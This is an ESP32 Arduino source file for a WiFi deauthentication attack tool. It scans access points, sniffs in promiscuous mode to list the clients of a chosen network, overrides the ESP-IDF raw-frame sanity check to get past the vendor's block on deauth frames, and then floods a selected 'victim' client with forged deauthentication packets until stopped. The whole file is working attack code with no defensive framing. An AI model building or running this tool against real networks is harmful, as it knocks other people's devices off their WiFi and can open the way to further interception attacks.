#include <WiFi.h>
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_event_loop.h"
#include "nvs_flash.h"
#include "driver/gpio.h"

#define WIFI_CHANNEL_SWITCH_INTERVAL  (500)
#define WIFI_CHANNEL_MAX               (13)

#define MAX_APS 20
#define MAX_CLIENTS 50

typedef struct {
  String ssid;
  uint8_t bssid[6];
  int32_t channel;
} APInfo;

typedef struct {
  uint8_t mac[6];
} ClientInfo;

APInfo foundAPs[MAX_APS];
int apCount = 0;

ClientInfo clients[MAX_CLIENTS];
int clientCount = 0;
uint8_t currentTargetBSSID[6];

uint8_t level = 0, channel = 1;

static wifi_country_t wifi_country = {.cc="CN", .schan = 1, .nchan = 13}; //Most recent esp32 library struct

typedef struct {
  unsigned frame_ctrl:16;
  unsigned duration_id:16;
  uint8_t addr1[6]; /* receiver address */
  uint8_t addr2[6]; /* sender address */
  uint8_t addr3[6]; /* filtering address */
  unsigned sequence_ctrl:16;
  uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

// Function prototypes
static esp_err_t event_handler(void *ctx, system_event_t *event);
static void wifi_sniffer_init(void);
static void wifi_sniffer_set_channel(uint8_t channel);
static const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type);
static void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type);

esp_err_t event_handler(void *ctx, system_event_t *event)
{
  return ESP_OK;
}

void wifi_sniffer_init(void)
{
  // Initialize sniffer
  nvs_flash_init();
  tcpip_adapter_init();
  ESP_ERROR_CHECK( esp_event_loop_init(event_handler, NULL) );
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK( esp_wifi_init(&cfg) );
  ESP_ERROR_CHECK( esp_wifi_set_country(&wifi_country) ); /* set country for channel range [1, 13] */
  ESP_ERROR_CHECK( esp_wifi_set_storage(WIFI_STORAGE_RAM) );
  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_NULL) );
  ESP_ERROR_CHECK( esp_wifi_start() );
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
}

void wifi_sniffer_set_channel(uint8_t channel)
{
  // Set sniffer channel (from chosen AP)
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

const char * wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
{
  // Macro -> string with the packet type
  switch(type) {
  case WIFI_PKT_MGMT: return "MGMT";
  case WIFI_PKT_DATA: return "DATA";
  default:  
  case WIFI_PKT_MISC: return "MISC";
  }
}

void wifi_sniffer_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT)
    return;

  // Get the wifi packet contents
  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
  const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

  uint8_t addr1[6];
  uint8_t addr2[6];
  memcpy(addr1,hdr->addr1,6);
  memcpy(addr2,hdr->addr2,6);

  // If the sender is AP, log the receiver's MAC
  if (isSameMAC(addr1, currentTargetBSSID) && !isSameMAC(addr2, currentTargetBSSID)) {
    if (!isClientKnown(addr2) && (clientCount < MAX_CLIENTS) && !isBroadcast(addr2)) {
      memcpy(clients[clientCount++].mac, addr2, 6);
      printPacket(hdr,ppkt,type);
    }
  }
  // If the receiver is AP, log the sender's MAC
  if (isSameMAC(addr2, currentTargetBSSID) && !isSameMAC(addr1, currentTargetBSSID)) {
    if (!isClientKnown(addr1) && (clientCount < MAX_CLIENTS) && !isBroadcast(addr1)) {
      memcpy(clients[clientCount++].mac, addr1, 6);
      printPacket(hdr,ppkt,type);
    }
  }

}

void printPacket( const wifi_ieee80211_mac_hdr_t* hdr,
                  const wifi_promiscuous_pkt_t *ppkt,
                  const wifi_promiscuous_pkt_type_t type){
  // Print a packet
  // Type - Channel - RSSI - addr1 - addr2 - addr3
  printf("PACKET TYPE=%s, CHAN=%02d, RSSI=%02d,"
    " ADDR1=%02x:%02x:%02x:%02x:%02x:%02x,"
    " ADDR2=%02x:%02x:%02x:%02x:%02x:%02x,"
    " ADDR3=%02x:%02x:%02x:%02x:%02x:%02x\n",
    wifi_sniffer_packet_type2str(type),
    ppkt->rx_ctrl.channel,
    ppkt->rx_ctrl.rssi,
    hdr->addr1[0],hdr->addr1[1],hdr->addr1[2],
    hdr->addr1[3],hdr->addr1[4],hdr->addr1[5],
    hdr->addr2[0],hdr->addr2[1],hdr->addr2[2],
    hdr->addr2[3],hdr->addr2[4],hdr->addr2[5],
    hdr->addr3[0],hdr->addr3[1],hdr->addr3[2],
    hdr->addr3[3],hdr->addr3[4],hdr->addr3[5]
  );
}

void printMAC(const uint8_t* mac) {
  // Print a MAC (6 bytes)
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) Serial.print("0");
    Serial.print(mac[i], HEX);
    if (i < 5) Serial.print(":");
  }
}

bool isSameMAC(const uint8_t* a, const uint8_t* b) {
  // Check if MAC's match
  for (int i = 0; i < 6; i++)
    if (a[i] != b[i]) return false;
  return true;
}

bool isBroadcast(const uint8_t* a) {
  // Check if MAC is broadcast (useful to not list in client list)
  const uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  return isSameMAC(a,broadcast);
}
bool isClientKnown(const uint8_t* mac) {
  // Check if MAC was already logged while sniffing
  for (int i = 0; i < clientCount; i++) {
    if (isSameMAC(mac, clients[i].mac)) return true;
  }
  return false;
}

// Required to allow raw frame sending
// ESP-IDF does not support deauth frame transmitting by default
// Check the following steps to get compilation going, otherwise
// you'll get a linking error regarding ieee80211_raw_frame_sanity_check 
// being a symbol that is already defined:
// https://www.reddit.com/r/WillStunForFood/comments/ot8vzl/finally_got_the_esp32_to_send_deauthentication/
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
  return 0;
}

void sendDeauth(uint8_t *ap, uint8_t *client) {
  // Deauth packet skeleton 
  // Frame control 0xc0 and reason code 0x0700
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x00, 0x00,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0x00, 0x00, 0x07, 0x00
  };

  // Copy the MAC addreses to the packet
  memcpy(&deauthPacket[4],  client, 6);
  memcpy(&deauthPacket[10], ap, 6);
  memcpy(&deauthPacket[16], ap, 6);

  // Send the packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

// Neded to read values correctly in Arduino IDE
int readIntFromSerial() {
  char buffer[10];
  int index = 0;

  // Wait until at least one character arrives
  while (!Serial.available());

  // Read until newline or buffer is full
  while (Serial.available()) {
    char c = Serial.read();

    if (c == '\n' || c == '\r') {
      break;
    }

    if (index < sizeof(buffer) - 1) {
      buffer[index++] = c;
    }
  }
  buffer[index] = '\0'; // Null-terminate

  return atoi(buffer);  // Convert to integer
}

void scanAPs() {
  // Scan for AP's
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect();
  delay(100);

  Serial.println("Scanning for WiFi networks...");
  int n = WiFi.scanNetworks(false, true);  // async=false, show_hidden=true
  apCount = (n > MAX_APS) ? MAX_APS : n;

  // Loop through all found APs
  for (int i = 0; i < apCount; ++i) {
    foundAPs[i].ssid = WiFi.SSID(i);
    memcpy(foundAPs[i].bssid, WiFi.BSSID(i), 6);
    foundAPs[i].channel = WiFi.channel(i);

    Serial.print("[" + String(i) + "] SSID: " + foundAPs[i].ssid + " | BSSID: ");
    printMAC(foundAPs[i].bssid);
    Serial.print(" | CH: ");
    Serial.println(foundAPs[i].channel);
  }
}

void promptDeauth() {
  // Read AP to be deauthed
  Serial.println("\nSelect AP index to deauth from list:");
  int idx = readIntFromSerial();
  if (idx >= apCount || idx < 0) {
    Serial.println("Invalid index.");
    return;
  }

  // Start sniffing for BSSID
  clientCount = 0;
  memcpy(currentTargetBSSID, foundAPs[idx].bssid, 6);
  wifi_sniffer_set_channel(foundAPs[idx].channel);
  wifi_sniffer_init();

  Serial.println("Sniffing for clients (15 seconds)...");
  Serial.print("BSSID to sniff: ");
  printMAC(currentTargetBSSID);
  Serial.println(""); // New line

  delay(15000); // Sniff for 15 seconds

  // Stop sniffing and deconfigure
  esp_wifi_set_promiscuous(false);
  //esp_wifi_stop();
  //esp_wifi_deinit();

  // No client found while sniffing
  if (clientCount == 0) {
    Serial.println("No clients found connected to this AP.");
    return;
  }

  // Found clients, print them out
  Serial.println("Connected clients:");
  for (int i = 0; i < clientCount; i++) {
    Serial.print("[" + String(i) + "] ");
    printMAC(clients[i].mac);
    Serial.println();
  }

  // Select one of the clients to deauth
  Serial.println("Select client index to deauth:");
  int victimIdx = readIntFromSerial();
  if (victimIdx < 0 || victimIdx >= clientCount) {
    Serial.println("Invalid client index.");
    return;
  }
  uint8_t* victim_mac = clients[victimIdx].mac;

  // Start deauth
  Serial.println("Starting deauth flood. Press 'x' to stop.");
  WiFi.mode(WIFI_MODE_AP);
  esp_wifi_set_channel(foundAPs[idx].channel, WIFI_SECOND_CHAN_NONE);

  // Busy loop until user presses 'x'
  while (true) {
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 'x') break;
    }
    sendDeauth(foundAPs[idx].bssid, victim_mac);
    delay(100);
  }

  Serial.println("Stopped.");
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  scanAPs();
  promptDeauth();
}

void loop() {
  // TODO: Restart flow without having to restart ESP32 through EN button.
}
